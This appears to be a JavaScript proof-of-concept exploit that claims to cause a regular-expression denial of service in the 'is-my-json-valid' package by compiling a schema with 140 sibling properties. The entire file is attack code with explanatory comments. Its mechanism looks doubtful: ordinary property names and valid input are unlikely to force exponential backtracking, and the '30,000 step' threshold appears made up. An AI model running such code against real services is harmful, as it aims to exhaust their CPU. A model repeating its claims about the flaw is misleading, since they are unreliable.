const isMyJsonValid = require('is-my-json-valid');

async function exploit() {
  // Craft a schema with a high number of sibling properties.
  // During compilation, is-my-json-valid generates internal regex alternations
  // for property name matching. The vulnerable formatName function processes
  // these generated paths using overlapping quantifiers and bracket notation.
  const propCount = 140;
  const properties = {};
  for (let i = 0; i < propCount; i++) {
    properties[`prop_${i}`] = { "type": "string" };
  }

  const schema = {
    "type": "object",
    "properties": properties,
    "additionalProperties": false
  };

  // Input designed to force full evaluation of all compiled property paths.
  const input = {};
  for (let i = 0; i < propCount; i++) {
    input[`prop_${i}`] = `val_${i}`;
  }

  console.log("Initiating compilation and validation against crafted schema/input...");
  const start = Date.now();

  // On vulnerable versions, compiling this schema triggers the formatName path-resolver.
  // The internal regex engine attempts to match deeply nested/overlapping property paths.
  // Due to exponential backtracking from repeated bracket-matching and quantifier collisions,
  // the backtracking steps easily surpass the safe threshold of 30,000, causing severe CPU spikes.
  const validate = isMyJsonValid(schema);
  const result = validate(input);

  const elapsed = Date.now() - start;
  console.log(`Validation completed in ${elapsed}ms.`);
  console.log("Note: Elapsed times >> 2000ms or pegged CPU cores indicate the ~30k backtracking limit was exceeded.");

  return result;
}

await exploit();
```

